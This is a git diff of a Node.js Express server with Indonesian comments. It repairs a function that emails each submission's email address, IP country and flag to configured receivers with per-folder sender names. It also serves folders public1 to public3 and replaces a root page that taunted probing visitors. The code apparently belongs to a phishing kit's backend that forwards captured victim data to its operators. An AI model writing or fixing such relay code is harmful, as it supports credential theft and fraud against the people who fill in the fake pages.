@@ -95,6 +95,7 @@ function getFlagEmoji(countryCode) {
 }
 
 // ========== FUNGSI KIRIM EMAIL ==========
+// ========== FUNGSI KIRIM EMAIL ==========
 async function sendEmail(data, folderName) {
     const countryName = data.country || data.ip_country || 'Unknown';
     let countryCode = '';
@@ -255,14 +256,18 @@ body{
 </body>
 </html>`;
     
-    const receivers = EMAIL_CONFIG[folderName];
-    for (const receiver of receivers) {
+    // INI YANG DIPERBAIKI
+    const config = EMAIL_CONFIG[folderName];
+    for (const receiver of config.email) {
         await transporter.sendMail({
-    from: `"${FOLDER_SETTINGS[folderName].fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
-    to: receiver,
-    subject: `${FOLDER_SETTINGS[folderName].subject} ${flagEmoji} ${data.email}`,
-    html: htmlContent
-});
+            from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
+            to: receiver,
+            subject: `${config.subject} ${flagEmoji} ${data.email}`,
+            html: htmlContent
+        });
+        console.log(`✅ [${folderName}] Sent to: ${receiver} as ${config.fromName}`);
+    }
+}
 
 // ========== ROUTING UNTUK MASING-MASING FOLDER ==========
 
@@ -383,7 +388,10 @@ app.get('/', (req, res) => {
         </head>
         <body>
             <div class="container">
-                <h1>Tolol lu mau ngapain</h1>
+                <h1>🔥 MULTI FOLDER SYSTEM</h1>
+                <a href="/public1/">📁 PUBLIC 1</a>
+                <a href="/public2/">📁 PUBLIC 2</a>
+                <a href="/public3/">📁 PUBLIC 3</a>
             </div>
         </body>
         </html>
